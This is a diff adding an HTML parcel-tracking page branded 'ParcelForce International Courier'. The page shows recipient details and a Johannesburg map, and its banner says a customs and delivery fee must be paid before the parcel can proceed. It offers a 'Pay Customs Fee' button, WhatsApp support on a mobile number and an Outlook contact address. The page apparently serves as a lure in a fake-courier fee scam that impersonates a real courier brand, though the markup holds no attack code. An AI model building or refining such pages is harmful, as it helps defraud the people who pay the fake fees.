@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Parcel Tracker</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      padding: 20px;
+      background: #f9f9f9;
+    }
+    h2, h3 {
+      color: #2c3e50;
+    }
+    .section {
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+      max-width: 600px;
+      margin: 0 auto 40px;
+    }
+    .status {
+      font-weight: bold;
+      padding: 6px 12px;
+      border-radius: 8px;
+      display: inline-block;
+      margin-bottom: 10px;
+    }
+    .in-transit { background-color: #ffe58f; color: #8c6d1f; }
+    .delivered { background-color: #d9f7be; color: #389e0d; }
+    .pending { background-color: #e6f7ff; color: #096dd9; }
+    .status-list li {
+      margin-bottom: 10px;
+    }
+    .progress-bar {
+      background-color: #eee;
+      border-radius: 5px;
+      height: 10px;
+      margin: 10px 0;
+    }
+    .progress {
+      background-color: #0078D4;
+      height: 100%;
+      width: 60%;
+      border-radius: 5px;
+    }
+    .progress-container {
+      display: flex;
+      justify-content: space-between;
+      margin: 20px 0;
+    }
+    .progress-step {
+      flex: 1;
+      text-align: center;
+      padding: 10px;
+      border-bottom: 4px solid #ccc;
+    }
+    .progress-step.active {
+      border-color: #52c41a;
+      font-weight: bold;
+    }
+    #map {
+      height: 300px;
+      margin-top: 20px;
+      border-radius: 8px;
+    }
+    .centered-message {
+      text-align: center;
+      padding: 40px 20px;
+    }
+    .centered-message h2 {
+      color: #c0392b;
+    }
+    .centered-message p {
+      font-size: 0.95em;
+      color: #555;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+    #dots {
+      animation: blink 1s infinite;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="loading" style="text-align:center; padding:20px;">
+    <p>Loading parcel data<span id="dots">...</span></p>
+  </div>
+
+  <div class="section" id="parcelDetails" style="display: none;">
+    <h2>Tracking Number: <span id="trackingNumber"></span></h2>
+    <p><strong>Last Updated:</strong> <span id="timestamp"></span></p>
+
+    <div class="progress-bar" aria-hidden="true">
+      <div class="progress" role="progressbar" aria-valuemin="0" aria-valuemax="100"></div>
+    </div>
+
+    <h3>Parcel Journey</h3>
+    <div class="progress-container">
+      <div class="progress-step">📦 Picked Up</div>
+      <div class="progress-step">🚚 In Transit</div>
+      <div class="progress-step">🏁 Delivered</div>
+    </div>
+
+    <div class="privacy-toggle">
+      <label><input type="checkbox" id="revealInfo" onchange="toggleInfo()"> Show recipient details</label>
+    </div>
+    <div id="recipientInfo" style="display: none;">
+      <p><strong>Sender:</strong> <span id="sender"></span></p>
+      <p><strong>Receiver:</strong> <span id="receiver"></span></p>
+      <p><strong>Address:</strong> <span id="address"></span></p>
+      <p><strong>Phone:</strong> <span id="phone"></span></p>
+      <p><strong>Email:</strong> <span id="email"></span></p>
+    </div>
+
+    <p><strong>Delivery Fee:</strong> <span id="deliveryFee"></span></p>
+    <p><strong>Estimated Delivery:</strong> <span id="estimatedDelivery"></span></p>
+
+    <h3>Status Updates</h3>
+    <ul id="status" class="status-list"></ul>
+
+    <div class="alert" role="status" aria-live="polite" id="customsAlert" style="display: none;">
+      ⚠ Customs and delivery fee of <strong id="feeAmount"></strong> must be paid before parcel can proceed for Delivery
+    </div>
+
+    <button class="support-btn" onclick="window.location.href='index.html'">🔙 Back to Home</button>
+    <button class="support-btn" onclick="window.open('https://wa.me/27633373857', '_blank')">WhatsApp Support</button>
+    <button class="support-btn" onclick="alert('Redirecting to secure payment portal...')">Pay Customs Fee</button>
+
+    <div id="map"></div>
+  </div>
+
+  <div class="centered-message" id="fallbackMessage" style="display: none;">
+    <h2>No parcel found for tracking number: <span id="missingRef">null</span></h2>
+    <hr style="margin: 30px auto; width: 80%;" />
+    <p>ParcelForce International Courier &copy; 2025. All rights reserved.</p>
+    <p>
+      Email: <a href="mailto:Parcel_Force1986@outlook.com">Parcel_Force1986@outlook.com</a> |
+      WhatsApp: <a href="https://wa.me/27633373857" target="_blank">+27 63 337 3857</a>
+    </p>
+  </div>
+
+  <script>
+    function toggleInfo() {
+      const info = document.getElementById('recipientInfo');
+      info.style.display = document.getElementById('revealInfo').checked ? 'block' : 'none';
+    }
+
+    document.getElementById("timestamp").textContent = new Date().toLocaleString();
+
+    const map = L.map('map').setView([-26.2041, 28.0473], 10);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      attribution: '&copy; OpenStreetMap contributors'
+    }).addTo(map);
+  </script>
+
+  <script type="module" src="track.js"></script>
+</body>
+</html>
